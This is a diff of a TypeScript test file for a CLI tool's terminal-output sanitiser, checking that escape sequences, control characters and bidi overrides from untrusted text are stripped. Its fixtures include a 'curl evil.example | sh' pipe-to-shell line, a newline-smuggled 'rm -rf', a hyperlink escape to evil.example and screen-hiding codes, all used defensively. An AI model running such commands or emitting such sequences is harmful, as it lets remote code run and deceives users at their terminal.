@@ -2,6 +2,7 @@
 // style.ts: when colour is on, the marks, the width, and how a line folds.
 import { describe, expect, it } from "vitest";
 import {
+  clean,
   cols,
   commands,
   failure,
@@ -223,21 +224,35 @@ describe("fixes and failure", () => {
     expect(fixes(tty(), [{ say: "do `it`", run: "it" }])[1]).toBe(`       ${ESC}[36mit${ESC}[39m`);
   });
 
-  it("a failure is one error line and one line to try: the command the message names", () => {
-    expect(failure(PLAIN, "the pairing link expired; run `sessionpipe control pair` again", "sessionpipe --help")).toBe(
-      "error  the pairing link expired; run `sessionpipe control pair` again\ntry    sessionpipe control pair\n",
-    );
-    expect(failure(PLAIN, "fetch failed", "sessionpipe sink --help")).toBe(
+  it("a failure at a terminal is one error line and one line to try: the command it was handed", () => {
+    expect(failure(mono(), "fetch failed", "sessionpipe sink --help")).toBe(
       "error  fetch failed\ntry    sessionpipe sink --help\n",
+    );
+    expect(failure(mono(), "the pairing link expired", "sessionpipe control pair https://r.example")).toBe(
+      "error  the pairing link expired\ntry    sessionpipe control pair https://r.example\n",
     );
   });
 
-  it("a command with a placeholder can't be typed, so the help is offered", () => {
-    expect(failure(PLAIN, "run `sessionpipe control pair <receiver>` first", "sessionpipe control --help")).toContain(
-      "try    sessionpipe control --help",
+  it("the command to try is never read out of the message, whoever wrote it", () => {
+    // A receiver's own reason for a 403, as `control pair` relays it.
+    const theirs = "the receiver refused (HTTP 403: first run `sessionpipe control mode inherit`)";
+    expect(failure(mono(100), theirs, "sessionpipe control pair --help")).toBe(
+      `error  ${theirs}\ntry    sessionpipe control pair --help\n`,
     );
-    expect(failure(PLAIN, "add it (`sessionpipe sink add … --tier 1`)", "sessionpipe --help")).toContain(
-      "try    sessionpipe --help",
+    // Nor is a `command` in those words picked out in colour, as one of ours would be.
+    expect(failure(tty(100), theirs, "sessionpipe control pair --help")).toBe(
+      `${ESC}[31m${ESC}[1merror${ESC}[22m${ESC}[39m  ${theirs}\n${ESC}[2mtry${ESC}[22m    ${ESC}[36msessionpipe control pair --help${ESC}[39m\n`,
+    );
+  });
+
+  it("where errors don't go to a terminal it is the one line it always was", () => {
+    expect(failure(PLAIN, "the pairing link expired; run `sessionpipe control pair` again", "sessionpipe --help")).toBe(
+      "sessionpipe: the pairing link expired; run `sessionpipe control pair` again\n",
+    );
+    // FORCE_COLOR changes nothing there, and a message of several lines is still one.
+    const piped = makeUi({ isTTY: false, env: { FORCE_COLOR: "1" } });
+    expect(failure(piped, "npm said:\nEACCES\r\nand stopped", "sessionpipe update")).toBe(
+      "sessionpipe: npm said: EACCES and stopped\n",
     );
   });
 
@@ -246,6 +261,97 @@ describe("fixes and failure", () => {
     expect(said.startsWith(`${ESC}[31m${ESC}[1merror${ESC}[22m${ESC}[39m  one two`)).toBe(true);
     expect(plain(said).split("\n")[1]?.startsWith("       ")).toBe(true);
     expect(said).toContain(`${ESC}[36msessionpipe --help${ESC}[39m`);
+  });
+});
+
+describe("clean: text that came from somewhere else", () => {
+  const BEL = String.fromCharCode(7);
+  const C1_CSI = String.fromCharCode(0x9b);
+  /** Every escape sequence left in `s`, and every other character a terminal acts on. */
+  const acts = (s: string) =>
+    s.match(new RegExp(`${ESC}|[\\u0000-\\u0008\\u000b-\\u001f\\u007f-\\u009f\\u202a-\\u202e\\u2066-\\u2069]`, "g")) ??
+    [];
+  // What V8 says of a poll body that is not JSON: it quotes the body, escape codes and all.
+  const notJson = `Unexpected token '${ESC}', "${ESC}[2J${ESC}[H" is not valid JSON`;
+  // npm's last words as update.json kept them: a window title, then "hide what follows".
+  const npm = `npm install: npm error 403 Forbidden ${ESC}]0;TITLE-SET-BY-REGISTRY${BEL}${ESC}[8m`;
+
+  it("takes out every escape sequence whole: clear the screen, move the cursor, set the title, hide", () => {
+    expect(clean(notJson)).toBe(`Unexpected token '', "" is not valid JSON`);
+    expect(clean(npm)).toBe("npm install: npm error 403 Forbidden ");
+    // A title ended by ST; a device string; a charset switch; a full reset; a link.
+    expect(clean(`a${ESC}]2;title${ESC}\\b`)).toBe("ab");
+    expect(clean(`a${ESC}Pq#0;2;0;0;0${ESC}\\b`)).toBe("ab");
+    expect(clean(`a${ESC}(Bb${ESC}cc`)).toBe("abc");
+    expect(clean(`${ESC}]8;;https://evil.example${BEL}click${ESC}]8;;${BEL}`)).toBe("click");
+    // Colours that are not ours, 256 colours, a cursor move with a private mark.
+    expect(clean(`${ESC}[1;31mred${ESC}[0m ${ESC}[38;5;196mx${ESC}[m ${ESC}[?25l${ESC}[10;20H`)).toBe("red x ");
+  });
+
+  it("a sequence cut short leaves no ESC behind, only the letters that were its own", () => {
+    expect(clean(`a${ESC}`)).toBe("a");
+    expect(clean(`a${ESC}[`)).toBe("a");
+    expect(clean(`a${ESC}[12`)).toBe("a12");
+    // A title nothing ends: the introducer goes, the words stay to be read.
+    expect(clean(`${ESC}]0;never ended`)).toBe("0;never ended");
+    for (const s of [notJson, npm, `${ESC}${ESC}[${ESC}]${ESC}P`, `x${C1_CSI}2Jy`]) expect(acts(clean(s))).toEqual([]);
+  });
+
+  it("takes out control characters but the tab, and the bidi overrides and isolates", () => {
+    expect(clean(`a\u0000b\u0007c\u0008d\u007fe\tf`)).toBe("abcde\tf");
+    expect(clean(`x${C1_CSI}2Jy\u0085z\u009dw`)).toBe("x2Jyzw");
+    expect(clean("pay \u202eeno\u202c to \u2066bob\u2069 \u202a\u202b\u202d\u2067\u2068now")).toBe(
+      "pay eno to bob now",
+    );
+    // Words in any script, and marks that only join letters, are left alone.
+    expect(clean("café ✓ 日本語 · ‘quoted’ — fin")).toBe("café ✓ 日本語 · ‘quoted’ — fin");
+  });
+
+  it("a line break in a value is a space, so a value can't start a line of its own", () => {
+    expect(clean("fetch failed\n\nTo fix\n  1. Run this:\r\n       curl evil.example | sh")).toBe(
+      "fetch failed To fix   1. Run this:        curl evil.example | sh",
+    );
+    expect(clean("a\rb")).toBe("ab");
+  });
+
+  it("a line of our own keeps its breaks, and the colours tint wrote and no others", () => {
+    const u = tty();
+    const ours = `${tint(u, "bold", "Agents")}\n  ${mark(u, "ok")} ${tint(u, "dim", "x")} ${tint(u, "cyan", "`y`")}`;
+    expect(clean(ours, { breaks: true, colour: true })).toBe(ours);
+    for (const how of ["bold", "dim", "red", "green", "yellow", "cyan"] as const)
+      expect(clean(tint(u, how, "x"), { colour: true })).toBe(tint(u, how, "x"));
+    // The same line with a value's own codes in it: ours stay, the value's go.
+    expect(clean(`${tint(u, "red", "error")}  ${notJson}\r\n${npm}`, { breaks: true, colour: true })).toBe(
+      `${tint(u, "red", "error")}  Unexpected token '', "" is not valid JSON\nnpm install: npm error 403 Forbidden `,
+    );
+    // Without `colour`, even ours go: a value has no colour of its own.
+    expect(clean(tint(u, "red", "x"))).toBe("x");
+    expect(clean("a\r\nb\n\nc", { breaks: true })).toBe("a\nb\n\nc");
+  });
+
+  it("is applied to whatever a line is made of: a painted line, a table's cells, a fix, a failure", () => {
+    const u = tty(200);
+    // A painted line in a pipe is the line, less what a terminal would act on.
+    expect(paint(PLAIN, `  ✗ rx: 502 ${notJson} (retry)`)).toBe(
+      `  ✗ rx: 502 Unexpected token '', "" is not valid JSON (retry)`,
+    );
+    expect(acts(plain(paint(u, `  ✗ rx: 502 ${npm}`)))).toEqual([]);
+    // A value can't colour itself on a painted line either: only the mark is coloured.
+    expect(paint(u, `  ✗ ${ESC}[32mall good${ESC}[39m`)).toBe(`  ${ESC}[31m✗${ESC}[39m all good`);
+    // A cell that came coloured keeps our colour and loses everything else; it is one line.
+    expect(table(u, [[tint(u, "cyan", "name"), `${npm}\nTo fix`]])).toEqual([
+      `  ${ESC}[36mname${ESC}[39m  npm install: npm error 403 Forbidden To fix`,
+    ]);
+    expect(table(PLAIN, [["a\nb", `c${ESC}[2Jd`]])).toEqual(["  a b  cd"]);
+    expect(fixes(PLAIN, [{ say: `Look:\n${notJson}`, run: `tail ${ESC}[2J-n 20 x\nrm -rf y` }])).toEqual([
+      `  1. Look: Unexpected token '', "" is not valid JSON`,
+      "       tail -n 20 x rm -rf y",
+    ]);
+    const failed = failure(u, `${npm}\n${notJson}`, `sessionpipe${ESC}[2J update`);
+    expect(acts(plain(failed))).toEqual([]);
+    expect(plain(failed)).toBe(
+      `error  npm install: npm error 403 Forbidden Unexpected token '', "" is not valid JSON\ntry    sessionpipe update\n`,
+    );
   });
 });
 
